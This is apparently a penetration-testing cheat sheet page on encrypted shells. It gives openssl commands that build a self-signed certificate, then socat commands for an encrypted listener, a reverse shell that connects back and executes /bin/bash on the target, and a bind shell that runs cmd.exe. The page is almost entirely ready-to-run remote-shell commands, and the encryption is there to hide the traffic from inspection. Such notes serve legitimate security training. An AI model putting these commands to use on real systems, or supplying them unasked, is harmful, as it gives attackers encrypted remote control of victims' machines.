# Encrypted Shells

## Listening

### Steps :&#x20;

{% code title="Step 1" overflow="wrap" %}
```bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt

#This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.
```
{% endcode %}

{% code title="Step 2" overflow="wrap" %}
```bash
cat shell.key shell.crt > shell.pem

#We then need to merge the two created files into a single .pem file
```
{% endcode %}

{% code title="Step 3" overflow="wrap" %}
```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

#This sets up an OPENSSL listener using our generated certificate. verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate must be used on whichever device is listening.
```
{% endcode %}

## Connect Back

{% code overflow="wrap" %}
```bash
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
The same technique would apply for a **Bind Shell**:

{% code title="Listener" %}
```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```
{% endcode %}

{% code title="Target" %}
```bash
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```
{% endcode %}



* [x] _**note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.**_
{% endhint %}
